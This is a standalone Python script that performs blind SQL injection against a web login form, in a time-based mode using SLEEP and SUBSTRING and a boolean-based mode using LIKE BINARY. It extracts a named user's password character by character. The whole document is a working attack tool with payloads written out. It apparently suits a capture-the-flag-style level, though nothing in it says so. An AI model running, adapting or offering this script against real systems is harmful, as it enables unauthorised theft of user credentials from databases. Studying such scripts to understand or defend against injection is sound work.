#!/usr/bin/env python3
import requests
import string
import time
import sys
import statistics

if len(sys.argv) != 6:
    print(f"Usage:\n  {sys.argv[0]} <url> <user> <pass> <target> <mode>")
    print("Modes: boolean | time")
    sys.exit(1)

URL, USER, PASS, TARGET, MODE = sys.argv[1:]
MODE = MODE.lower()

CHARSET = string.ascii_letters + string.digits
PASSWORD_LEN = 32

# --- Time-based tuning ---
SLEEP_TIME = 2
SAMPLES = 5
TIMEOUT = 10


session = requests.Session()
session.auth = (USER, PASS)
session.headers.update({"Connection": "keep-alive"})


def median_time(payload):
    times = []
    for _ in range(SAMPLES):
        t0 = time.time()
        try:
            session.post(URL, data={"username": payload}, timeout=TIMEOUT)
        except requests.exceptions.RequestException:
            pass
        times.append(time.time() - t0)
    return statistics.median(times)


def get_baseline():
    payload = f'{TARGET}" AND IF(1=0, SLEEP({SLEEP_TIME}), 0)-- '
    return median_time(payload)


def time_based():
    print("[*] Mode: TIME-BASED SQLi")
    baseline = get_baseline()
    threshold = baseline + (SLEEP_TIME * 0.6)

    print(f"[*] Baseline: {baseline:.3f}s | Threshold: {threshold:.3f}s\n")

    password = ""

    for pos in range(1, PASSWORD_LEN + 1):
        found = False
        for ch in CHARSET:
            payload = (
                f'{TARGET}" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}",'
                f'SLEEP({SLEEP_TIME}),0)-- '
            )
            delay = median_time(payload)

            if delay > threshold:
                password += ch
                print(f"[+] {pos}: {ch}  →  {password}")
                found = True
                break

        if not found:
            print("[!] No more characters found.")
            break

    print("\n[✓] Final password:", password)


def boolean_based():
    print("[*] Mode: BOOLEAN-BASED SQLi")

    password = ""

    for pos in range(1, PASSWORD_LEN + 1):
        found = False
        for ch in CHARSET:
            payload = f'" OR username="{TARGET}" AND password LIKE BINARY "{password}{ch}%" -- '
            r = session.post(URL, data={"username": payload})

            if "This user exists" in r.text:
                password += ch
                print(f"[+] {password}")
                found = True
                break

        if not found:
            print("[!] No more characters found.")
            break

    print("\n[✓] Final password:", password)


if MODE == "time":
    time_based()
elif MODE == "boolean":
    boolean_based()
else:
    print("Invalid mode. Use: time | boolean")
